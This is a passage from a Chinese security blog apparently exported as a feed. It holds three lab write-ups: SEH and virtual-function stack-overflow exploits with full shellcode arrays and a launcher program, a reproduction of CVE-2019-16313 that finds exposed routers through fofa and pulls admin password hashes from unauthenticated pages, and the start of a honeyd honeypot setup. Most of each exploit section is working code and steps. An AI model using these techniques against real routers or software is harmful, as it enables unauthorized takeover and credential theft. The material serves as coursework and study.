class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x48\xFE\x12\x00&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MyExceptionHandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;got an exception,press Enter to kill process!\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span>* input)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="comment">//printf(&quot;%d&quot;,strlen(shellcode));</span></span><br><span class="line">	<span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(buf,input);</span><br><span class="line">		zero=<span class="number">4</span>/zero;</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyExceptionHandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	test(shellcode);</span><br><span class="line">	<span class="comment">//test(&quot;abc&quot;);</span></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>函数<code>MyExceptionhandler()</code>是异常处理函数;</li>
<li><code>Test()</code>函数的<code>strcpy</code>处是典型栈溢出漏洞;</li>
<li><code>_try&#123;&#125;</code>在<code>test</code>函数栈帧中安装一个<code>S.E.H结构</code>，其中除<code>0</code>操作会产生异常。<code>strcpy</code>操作没有产生溢出时，除<code>0</code>操作产生的异常会被异常处理函数处理，而当<code>strcpy</code>操作产生溢出时，会将栈帧中<code>S.E.H</code>异常处理句柄改为<code>shellcode</code>入口地址，代码植入成功。</li>
</ol>
<h1 id="调试SEH攻击代码"><a href="#调试SEH攻击代码" class="headerlink" title="调试SEH攻击代码"></a>调试SEH攻击代码</h1><ol>
<li><p>为了能出发<code>int 3</code>断点时启动<code>OllyDbg</code>，设置<code>OllyDbg</code>为实时调试器</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851188253.png" alt="1565851188253"></p>
</li>
<li><p>运行刚刚创建的<code>SHE_attack.exe</code>，发现要求创建<code>UDD</code>目录</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851194716.png" alt="1565851194716"></p>
</li>
<li><p>运行刚刚创建的<code>SHE_attack.exe</code>，发现要求创建<code>UDD</code>目录</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851200766.png" alt="1565851200766"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851208465.png" alt="1565851208465"></p>
</li>
<li><p>两个路径设置成功后，重新运行<code>SHE_attack.exe</code>程序，成功在<code>int 3</code>上启动<code>OllyDbg</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851215407.png" alt="1565851215407"></p>
</li>
<li><p>在<code>strcpy</code>函数处设置断点，程序运行到此处时观察右下角缓冲区数据，可以看到在执行<code>strcpy</code>函数之前，<code>shellcode</code>的起始地址为<code>0x0012FE48</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851226446.png" alt="1565851226446"></p>
</li>
<li><p>执行完<code>strcpy</code>，确认<code>shellcode</code>的起始位置是<code>0x0012FE48</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851232753.png" alt="1565851232753"></p>
</li>
<li><p>查看<code>S.E.H链</code>，地址<code>0x0012FF18</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851240943.png" alt="1565851240943"></p>
</li>
<li><p>查看地址<code>0x0012FF18</code>的记录，发现其指向下一个<code>SHE指针</code>，接着是异常处理程序, 只需要把<code>0x0012FF1C</code>这个 地址的内容改成<code>shellcode</code>起始地址即可</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851300622.png" alt="1565851251908"></p>
</li>
<li><p>由于<code>shellcode</code>的起始地址为 <code>0x0012FE48</code>，第一个<code>S.E.H地址</code>为 <code>0x0012FF18</code>(指向下一个<code>S.E.H</code>的指针) <code>0x0012FF1C</code>(异常处理地址)，因此<code>shellcode</code>需要使用<code>0x0012FF1C-0x0012FE48=212</code>个字节进行填充。使用上次作业弹出框的<code>shellcode</code>，剩下的空间用<code>0x90</code>补齐至<code>212</code>字节，在<code>213-216</code>字节使用<code>0x0012FE48</code>填充，注释掉<code>_asm int 3</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565849959690.png" alt="1565849959690"></p>
</li>
<li><p>启动程序，成功出现弹框</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565849990658.png" alt="1565849990658"></p>
</li>
<li><p><code>shellcode</code>已经被执行，但是点击确定却没有反应，因为**<code>shellcode</code>已经被当作系统异常处理来进行了**，所以点击确定不会退出程序。</p>
</li>
</ol>
<h1 id="调试虚函数攻击代码"><a href="#调试虚函数攻击代码" class="headerlink" title="调试虚函数攻击代码"></a>调试虚函数攻击代码</h1><ol>
<li><p>与<code>SEH</code>实验相同，运行<code>SHE_attack.exe</code>程序，成功在<code>int 3</code>上启动<code>OllyDbg</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851481979.png" alt="1565851481979"></p>
</li>
<li><p>在<code>strcpy</code>函数处设置断点，程序运行到此处时观察右下角缓冲区数据，可以看到在执行<code>strcpy</code>函数之前，<code>shellcode</code>的起始地址为<code>0x0042E27C</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851522215.png" alt="1565851522215"></p>
</li>
<li><p>根据<code>shellcode</code>起始地址<code>0042E27C</code>改写<code>shellcode</code>，<code>shellCode</code>长度为 <code>216 Bytes</code>，换算成十六进制为<code>D8</code>，故<code>shellcode</code>的末尾后四个字节地址是<code>0x0042E27C+0xD8–0x4=0x0042E350</code>修改源程序</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851692024.png" alt="1565851692024"></p>
</li>
<li><p>启动程序，成功出现弹框，shellcode植入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851722541.png" alt="1565851722541"></p>
</li>
</ol>
<h1 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a>测试结论</h1><p>​        可以利用栈溢出数据把<code>S.E.H</code>的异常处理函数地址替换为<code>shellcode</code>入口地址，让程序跳转去执行<code>shellcode</code>来实现我们自己的目的。</p>
<p>​        也可以通过利用虚函数原理达到攻击目的，让程序按照我们预先伪造的虚函数指针去寻找虚表，而在此处填上<code>shellcode</code>的起始地址作为伪造的虚函数入口地址，让程序跳转去执行<code>shellcode</code>。虚函数攻击原理如下：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565851802367.png" alt="1565851802367"></p>
<p>​        通过以上两种方法都是利用了溢出手段来实现攻击目的，但是如今微软操作系统的安全性也在不断进步，很多溢出手段在新版本的操作系统上无法应用，日后还需要进行更加深入的研究。</p>
<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>针对虚函数思考题程序，在不修改源代码的情况下，研究如何利用栈溢出的方式攻击目标代码，通过命令行的方式植入<code>shellcode</code>，弹出对话框。</p>
<ol>
<li><p>分析程序源代码，发现程序运行需要输入两个参数，并且<code>main()</code>函数两次调用<code>strcpy()</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vf1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable1::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">vf overflow, *p;</span><br><span class="line">vf1 overflow1, *p1;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//char * p_vtable;</span></span><br><span class="line">	<span class="comment">//p_vtable=overflow.buf-4;//point to virtual table</span></span><br><span class="line"><span class="comment">//	__asm int 3</span></span><br><span class="line">	<span class="comment">//reset fake virtual table to 0x004088cc</span></span><br><span class="line">	<span class="comment">//the address may need to ajusted via runtime debug</span></span><br><span class="line">	<span class="comment">//p_vtable[0]=0x30;</span></span><br><span class="line">	<span class="comment">//p_vtable[1]=0xE4;</span></span><br><span class="line">	<span class="comment">//p_vtable[2]=0x42;</span></span><br><span class="line">	<span class="comment">//p_vtable[3]=0x00;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow.buf,argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow1.buf,argv[<span class="number">2</span>]);<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">		p=&amp;overflow;</span><br><span class="line">		p-&gt;test();</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;vf argv1 argv2\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>使用<code>ollydbg</code>打开<code>vf.exe</code>程序文件，没有找到调用<code>strcpy()</code>函数的命令，猜想可能是反汇编时使用其他函数代替了，使用<code>IDA</code>打开查看，找到<code>strcpy</code>处的地址为<code>0x0041193E</code>和<code>0x00411952</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852130345.png" alt="1565852130345"></p>
</li>
<li><p>分析反汇编代码，发现<code>0x00411974</code>处调用了<code>call dword ptr [edx]</code>，不同于常见的类似于<code>call sub_xxxxxx</code>的调用方式，这种看不见地址的调用是使用虚函数的标志。<code>mov ecx,dword_42EB08</code>访问指向这个对象开头的指针，而<code>mov edx,[ecx]</code>访问这个对象开头的前4个字节，最后<code>call dword ptr [edx]</code>调用虚函数。整个过程如下图所示。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852211877.png" alt="1565852211877"></p>
</li>
<li><p>使用<code>ollydbg</code>打开程序，在地址<code>0x0041193E</code>和<code>0x00411952</code>处设置断点，即在两个调用<code>strcpy</code>的地方设置断点。点击<code>调试-&gt;参数</code>，为程序输入命令行参数</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852252563.png" alt="1565852252563"></p>
</li>
<li><p>运行程序至两个断点处，观察右下角缓冲区数据，得到<code>dest1</code>的地址为<code>0x0042EB5C</code>，<code>dest2</code>的地址为<code>0x42EB14</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852281949.png" alt="1565852281949"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852289720.png" alt="1565852289720"></p>
</li>
<li><p>在数据窗口中追踪<code>dest1</code>的地址，为<code>0x0042801C</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852318989.png" alt="1565852318989"></p>
</li>
<li><p>之前分析<code>dword_42EB08</code>是对象开头的指针，根据地址<code>0x0041195A</code>处的汇编代码<code>mov dword_42EB08,offset unk_42EB58</code>表明<code>0x0042EB58</code>处是对象开头的位置了。<code>0X0042EB58</code>刚好在<code>dest</code>地址<code>0X0042EB5C</code>之前说明了调用的函数是虚函数，虚表指针地址为<code>0x0042801C</code></p>
</li>
<li><p>仍然使用前面实验的<code>shellcode</code>和计算地址的办法，把这个地方覆盖为<code>shellcode</code>尾部的地址<code>0x0042EB5C+0xD8-0x4=0x0042EC30</code>，<code>shellcode</code>尾部再填上伪造的虚函数入口地址即可。由于于<code>dest1</code>的地址刚好在虚表指针地址之后，<code>dest2</code>的地址在虚表指针地址之前，用<code>dest2</code>的地址进行覆盖</p>
</li>
<li><p>编写shellcode如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode1[]=</span><br><span class="line"><span class="string">&quot;\x33\xDB\x53\x68\x31\x32\x33\x34\x68\x41\x42\x43\x44\x8B\xC4\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x5C\xEB\x42\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode2[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x30\xEC\x42\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> command[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">memset</span>(command,<span class="number">0</span>,<span class="keyword">sizeof</span>(command));</span><br><span class="line">	<span class="built_in">strcpy</span>(command,<span class="string">&quot;\&quot;C:\\vf.exe\&quot; &quot;</span>);</span><br><span class="line">	<span class="built_in">strcat</span>(command,shellcode1);</span><br><span class="line">	<span class="built_in">strcat</span>(command,<span class="string">&quot; &quot;</span>);</span><br><span class="line">	<span class="built_in">strcat</span>(command,shellcode2);</span><br><span class="line">	system(command);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>运行shellcode程序，成功弹出会话框</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565852843165.png" alt="1565852843165"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>虚函数攻击</tag>
        <tag>SEH攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>蜂网企业级路由器漏洞</title>
    <url>/%E8%9C%82%E7%BD%91%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<h2 id="【CVE-2019-16313】蜂网互联企业级路由器v4-31密码泄露漏洞"><a href="#【CVE-2019-16313】蜂网互联企业级路由器v4-31密码泄露漏洞" class="headerlink" title="【CVE-2019-16313】蜂网互联企业级路由器v4.31密码泄露漏洞"></a>【CVE-2019-16313】蜂网互联企业级路由器v4.31密码泄露漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>蜂网互联企业级路由器v4.31存在接口未授权访问，导致攻击者可以是通过此漏洞得到路由器账号密码接管路由器</p>
<span id="more"></span>

<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>蜂网互联企业级路由器v4.31</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
<li><p>通过fofa寻找蜂网路由器<code>app="蜂网互联-互联企业级路由器”</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912200306.png"></p>
</li>
<li><p>访问<code>/index.htm?PAGE=web</code>链接，此链接未授权访问（里面的操作需要认证）可以看到，账号密码存在接口访问</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912222044.png"></p>
</li>
<li><p><code>/action/usermanager.htm</code>存在未授权访问，如果存在漏洞可通过直接访问获得账号和密码HASH。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912222120.png"></p>
<p>如果不存在漏洞，则会出现如下内容：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912222149.png"></p>
</li>
<li><p>解密哈希即可获得密码，从而登录系统。</p>
</li>
</ol>
<p><strong>注：仅当作技术研究，请勿用于非法用途 后果作者概不负责！！！</strong></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞 蜂网路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>蜜罐攻击检测实验</title>
    <url>/%E8%9C%9C%E7%BD%90%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol>
<li>使用<code>honeyd</code>软件实现低交互蜜罐，要求能够模拟主机、服务、漏洞和网络拓扑。</li>
<li>在虚拟机上部署具有可利用漏洞的系统、软件或网站。</li>
<li>使用扫描器、<code>metasploit</code>等攻击工具对网络靶场进行攻击，达到扫描探测、信息获取、获取管理员权限、窃取管理员密码、拒绝服务、文件篡改、进程操作等攻击效果。</li>
<li>物理蜜罐上使用入侵检测工具<code>snort</code>，或编写信息采集、日志分析代码，检测并记录受到的攻击。记录形式如：日志文件、告警文件、实时显示等方式。<span id="more"></span></li>
</ol>
<h1 id="安装配置Honeyd"><a href="#安装配置Honeyd" class="headerlink" title="安装配置Honeyd"></a>安装配置<code>Honeyd</code></h1><h2 id="Honeyd及其依赖项简介"><a href="#Honeyd及其依赖项简介" class="headerlink" title="Honeyd及其依赖项简介"></a>Honeyd及其依赖项简介</h2><p>​        <code>Honeyd</code>是一个可以在网络上创建虚拟主机的小型<code>daemon</code>。可以对此虚拟主机的服务和TCP进行配置，使其在网络中看起来是在运行某种操作系统。<code>Honeyd</code>可以使一台主机在局域网中模拟出多个地址以满足网络实验环境的要求。通过对配置文件进行设置可以使虚拟计算机模拟运行任何服务。也可以使用服务代理替代服务模拟。</p>
<ol>
<li><code>libevent</code>,一个非同步事件通知的函数库。通过使用<code>libevent</code>，开发者能够设定某些事件发生时所运行的函数，能够取代以往程序所使用的循环检查。</li>
<li><code>libdnet</code>，为若干个低层的网络例程提供了一个简单的可移植的接口，包括网络地址处理，内核 <code>arp</code> 缓冲和路由表查找和管理，网络防火墙（<code>IP filter</code>, <code>ipfw</code>, <code>ipchains</code>, <code>pf</code>, <code>PktFilter</code>, …)，网络接口查找和管理，IP 隧道（<code>BSD/Linux tun</code>, <code>Universal TUN/TAP device</code>)，未加工的 IP 包和以太网帧的传输。</li>
<li><code>libpcap</code>，<code>unix/linux</code>平台下的网络数据包捕获函数包，大多数网络监控软件都以它为基础。<code>Libpcap</code> 可以在绝大多数类 <code>unix </code>平台下工作。</li>
<li><code>arpd</code>，执行在与<code>honeyd</code>同样的系统上。是<code>honeyd</code>众多协作工具中最重要的一个。<code>Arpd</code>工作时监视局域网内的流量。并通过查看<code>honeyd</code>系统的<code>ARP表</code>推断其他系统的活动与否。<code>arpd</code>将对指定的 IP 地址范围内未使用的 IP 用 <code>honeyd</code>主机的 <code>MAC 地址</code>做出<code>arp应答</code>。</li>
<li><code>zlib</code>，<code>Linux</code>核心使用<code>zlib</code>以实作网络协定的压缩、档案系统的压缩以及开机时解压缩自身的核心。</li>
</ol>
<h2 id="安装Honeyd及其依赖项"><a href="#安装Honeyd及其依赖项" class="headerlink" title="安装Honeyd及其依赖项"></a>安装Honeyd及其依赖项</h2><ol>
<li><p>从官网下载安装<code>honeyd-1.5c</code></p>
<p>下载地址<a href="http://www.honeyd.org/release.php">http://www.honeyd.org/release.php</a></p>
</li>
<li><p>下载解压编译安装honeyd的依赖库：<code>libevent</code>、<code>libdumbnet</code>、<code>libpcap</code>、<code>libedit</code>，参考<a href="https://www.cnblogs.com/yjbjingcha/p/6791631.html">https://www.cnblogs.com/yjbjingcha/p/6791631.html</a></p>
</li>
<li><p>安装<code>arpd-0.2</code>库</p>
</li>
<li><p>成功安装<code>honeyd</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565763010078.png" alt="1565763010078"></p>
</li>
</ol>
<h2 id="网络拓扑结构"><a href="#网络拓扑结构" class="headerlink" title="网络拓扑结构"></a>网络拓扑结构</h2><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767984997.png" alt="1565767984997"></p>
<h2 id="日志及配置文件"><a href="#日志及配置文件" class="headerlink" title="日志及配置文件"></a>日志及配置文件</h2><ol>
<li><p>日志文件及位置为<code>/var/log/honeyd/honeyd.log</code>和<code>/var/log/honeyd/service.log</code></p>
</li>
<li><p><code>honeyd</code>配置文件及位置为<code>/root/桌面/honeyd.conf</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">route entry 192.168.43.153 network 192.168.43.144/28   </span><br><span class="line">route 192.168.43.153 link 192.168.43.152/29  </span><br><span class="line"></span><br><span class="line">route 192.168.43.153 add net 192.168.43.156/30 192.168.43.157</span><br><span class="line">route 192.168.43.157 link 192.168.43.165/30</span><br><span class="line"></span><br><span class="line">create windows</span><br><span class="line">set windows personality &quot;Microsoft Windows 2000 SP2&quot;   </span><br><span class="line">set windows default tcp action reset   </span><br><span class="line">set windows default udp action reset   </span><br><span class="line">set windows default icmp action open</span><br><span class="line">add windows tcp port 110 &quot;/usr/share/honeyd-1.5c/scripts/pop3.pl&quot;</span><br><span class="line">add windows tcp port 80 &quot;/usr/share/honeyd-1.5c/scripts/web.sh&quot;</span><br><span class="line">add windows tcp port 25 &quot;/usr/share/honeyd-1.5c/scripts/smtp.pl&quot;</span><br><span class="line">add windows tcp port 23 &quot;/usr/share/honeyd-1.5c/scripts/router-telnet.pl&quot;</span><br><span class="line">add windows tcp port 21 proxy 192.168.43.1:21</span><br><span class="line"></span><br><span class="line">create linux</span><br><span class="line">set linux personality &quot;Linux 2.4.20&quot;   </span><br><span class="line">set linux default tcp action reset   </span><br><span class="line">set linux default udp action reset   </span><br><span class="line">set linux default icmp action open</span><br><span class="line">add linux tcp port 80 &quot;/usr/share/honeyd-1.5c/scripts/web.sh&quot;</span><br><span class="line">add linux tcp port 23 &quot;/usr/share/honeyd-1.5c/scripts/router-telnet.pl&quot;</span><br><span class="line">add linux tcp port 22 &quot;/usr/share/honeyd-1.5c/scripts/ssh.sh&quot;</span><br><span class="line">add linux tcp port 21 proxy 192.168.43.1:21</span><br><span class="line">add linux tcp port 20 open</span><br><span class="line"></span><br><span class="line">create router   </span><br><span class="line">set router personality &quot;Cisco 7206 running IOS 11.1(24)&quot;   </span><br><span class="line">set router default tcp action reset</span><br><span class="line">add router tcp port 23 &quot;/usr/share/honeyd-1.5c/scripts/router-telnet.pl&quot;  </span><br><span class="line"></span><br><span class="line">bind 192.168.43.153 router   </span><br><span class="line">bind 192.168.43.156 router  </span><br><span class="line"></span><br><span class="line">bind 192.168.43.154 windows   </span><br><span class="line">bind 192.168.43.155 linux   </span><br><span class="line">bind 192.168.43.157 windows   </span><br><span class="line">bind 192.168.43.158 linux  </span><br></pre></td></tr></table></figure></li>
<li><p>各种端口配置文件位于<code>/honeyd/honeyd-1.5c/script</code>位置，包括</p>
<p><code>ssh.sh</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># $1: srcip, $2: srcport, $3: dstip, $4: dstport, $5: config</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># modified by Fabian Bieker &lt;fabian.bieker@web.de&gt;</span></span><br><span class="line"><span class="comment"># modified by DataSoft Corporation</span></span><br><span class="line"><span class="comment">#. scripts/misc/base.sh</span></span><br><span class="line">SRCIP=<span class="variable">$1</span></span><br><span class="line">SRCPORT=<span class="variable">$2</span></span><br><span class="line">DSTIP=<span class="variable">$3</span></span><br><span class="line">DSTPORT=<span class="variable">$4</span></span><br><span class="line"></span><br><span class="line">STRINGSFILE=<span class="variable">$5</span></span><br><span class="line">VERSION=`perl -nle <span class="string">&#x27;/SSH_VERSION (.*)/ and print $1&#x27;</span> &lt; <span class="variable">$STRINGSFILE</span>`</span><br><span class="line"></span><br><span class="line">SERVICE=<span class="string">&quot;ssh&quot;</span></span><br><span class="line">HOST=<span class="string">&quot;serv&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_start</span><br><span class="line"></span><br><span class="line"><span 